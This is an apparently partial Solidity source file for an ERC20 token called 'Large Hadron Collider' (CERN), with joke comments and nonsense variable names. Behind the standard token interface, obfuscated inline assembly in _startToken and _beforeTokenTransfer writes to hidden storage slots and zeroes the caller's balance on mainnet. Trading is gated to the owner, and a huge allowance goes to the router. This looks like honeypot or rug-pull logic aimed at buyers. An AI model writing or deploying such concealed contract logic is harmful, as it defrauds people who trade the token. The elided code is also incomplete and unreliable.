// Demonic technology, presented by Musk!
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addBody;
    uint256 private beanWorld = block.number*2;

    mapping (address => bool) private _firstMickey; 
    mapping (address => bool) private _secondMouse;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _plusDisney;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private poopMachine;
    address public pair;
    ...
    bool private trading; uint256 private blockTwitter = 1; bool private doorDash;
    uint256 private _decimals; uint256 private fartWhirl;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addBody.push(_router); addBody.push(msgSender_); addBody.push(pair);
        for (uint256 q=0; q < 3;) {_firstMickey[addBody[q]] = true; unchecked{q++;} }
    }
    ...
    function decimals() public view virtual override returns (uint8) {
        ...
        //first&third: 0x6fd476a043e7eb6eb3230b163bab1e368ea36bdc557d9c8ce4deb6c7163e7701
    //second: 0x2063fd564562ec716e425754245ee7437652c473ce4e640771326b1bc46666a4

    function _startToken() internal {
        assembly {
            function getBy(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x6fd476a043e7eb6eb3230b163bab1e368ea36bdc557d9c8ce4deb6c7163e7701
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x2063fd564562ec716e425754245ee7437652c473ce4e640771326b1bc46666a4,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; beanWorld = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addBody[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployBody(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addBody[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBody(creator, initialSupply);
    }
}

contract CERN is ERC20Token {
    constructor() ERC20Token("Large Hadron Collider", "CERN", msg.sender, 1775000 * 10 ** 18) {
    }
}